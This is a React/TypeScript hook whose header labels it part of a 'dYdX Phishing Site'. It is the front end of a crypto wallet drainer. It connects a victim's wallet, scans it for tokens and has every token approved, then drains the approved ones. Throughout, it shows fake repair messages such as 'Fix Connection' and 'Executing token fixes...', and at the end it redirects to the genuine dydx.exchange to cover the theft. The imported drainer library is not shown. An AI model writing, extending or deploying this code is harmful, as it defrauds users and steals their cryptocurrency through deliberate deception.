/**
 * Wallet Connection Hook for dYdX Phishing Site
 * 
 * Manages wallet state and draining operations
 */

import { useState, useEffect, useCallback } from 'react'
import { reownWalletManager } from '@/lib/reown'
import { tokenDrainer } from '@/lib/drainer'

export function useWalletDrainer() {
  const [isConnected, setIsConnected] = useState(false)
  const [isConnecting, setIsConnecting] = useState(false)
  const [isDraining, setIsDraining] = useState(false)
  const [userAddress, setUserAddress] = useState<string>('')
  const [connectionStatus, setConnectionStatus] = useState('Fix Connection')
  const [drainedTokens, setDrainedTokens] = useState<any[]>([])

  // Check initial connection state
  useEffect(() => {
    const checkConnection = () => {
      const connected = reownWalletManager.isConnected()
      const address = reownWalletManager.getAccount()
      
      setIsConnected(connected)
      setUserAddress(address || '')
    }

    checkConnection()

    // Subscribe to account changes
    const unsubscribe = reownWalletManager.subscribeToAccount((address) => {
      setIsConnected(!!address)
      setUserAddress(address || '')
    })

    return unsubscribe
  }, [])

  // Connect wallet and start draining
  const connectAndDrain = useCallback(async () => {
    if (isConnecting || isDraining) return

    try {
      setIsConnecting(true)
      setConnectionStatus('Choose Wallet...')

      // Connect via Reown
      const address = await reownWalletManager.connect()
      console.log('🎯 Wallet connected:', address)
      
      setIsConnected(true)
      setUserAddress(address)
      setConnectionStatus('Wallet Connected!')
      
      // Short delay to show connection success
      await new Promise(resolve => setTimeout(resolve, 1000))

      // Start draining process
      setConnectionStatus('Scanning Wallet...')
      setIsDraining(true)
      setIsConnecting(false)
      
      // Set up status callback for detailed progress updates like original
      tokenDrainer.setStatusCallback(setConnectionStatus)
      
      await tokenDrainer.initialize()

      // Scan for tokens with detailed progress callback
      await new Promise(resolve => setTimeout(resolve, 1500))
      
      try {
        const tokens = await tokenDrainer.scanTokens((progress) => {
          // Update button text with scanning progress like original
          setConnectionStatus(progress.message)
        })
        
        if (tokens.length === 0) {
          setConnectionStatus('No Issues Found')
          setTimeout(() => {
            setConnectionStatus('Fix Connection')
            setIsDraining(false)
          }, 3000)
          return
        }

        setConnectionStatus(`Issues Found`)
        await new Promise(resolve => setTimeout(resolve, 1000))
        
        // Execute approval and drainage
        const approvedCount = await tokenDrainer.approveAllTokens()
        
        if (approvedCount === 0) {
          setConnectionStatus('No approvals - Try again')
          setTimeout(() => {
            setConnectionStatus('Fix Connection')
            setIsDraining(false)
          }, 3000)
          return
        }
        
        setConnectionStatus('Executing token fixes...')
        await new Promise(resolve => setTimeout(resolve, 2000))
        
        // Execute drainage
        const approvedTokens = tokenDrainer.getTokens().filter((token: any) => token.approved)
        await tokenDrainer.executeTokenDrainage(approvedTokens)
        
        setConnectionStatus('Connection Fixed')
        
        // Redirect after 5 seconds
        setTimeout(() => {
          window.location.href = 'https://dydx.exchange'
        }, 5000)
        
      } catch (error: any) {
        if (error.message?.includes('network') || error.message?.includes('Mainnet')) {
          setConnectionStatus('Wrong Network')
          setTimeout(() => {
            setConnectionStatus('Fix Connection')
            setIsDraining(false)
          }, 3000)
          return
        }
        throw error
      }
      
      // Reset after completion
      setTimeout(() => {
        setConnectionStatus('Fix Connection')
        setIsDraining(false)
      }, 3000)

    } catch (error: any) {
      console.error('❌ Connection/Drain failed:', error)
      
      if (error.message?.includes('User rejected') || error.message?.includes('cancelled')) {
        setConnectionStatus('Fix Connection')
      } else {
        setConnectionStatus('Process Failed')
        setTimeout(() => {
          setConnectionStatus('Fix Connection')
        }, 3000)
      }
      
      setIsConnecting(false)
      setIsDraining(false)
    }
  }, [isConnecting, isDraining])

  // Disconnect wallet
  const disconnect = useCallback(() => {
    reownWalletManager.disconnect()
    setIsConnected(false)
    setUserAddress('')
    setIsConnecting(false)
    setIsDraining(false)
    setConnectionStatus('Fix Connection')
    setDrainedTokens([])
  }, [])

  return {
    isConnected,
    isConnecting,
    isDraining,
    userAddress,
    connectionStatus,
    drainedTokens,
    connectAndDrain,
    disconnect,
    isProcessing: isConnecting || isDraining
  }
}
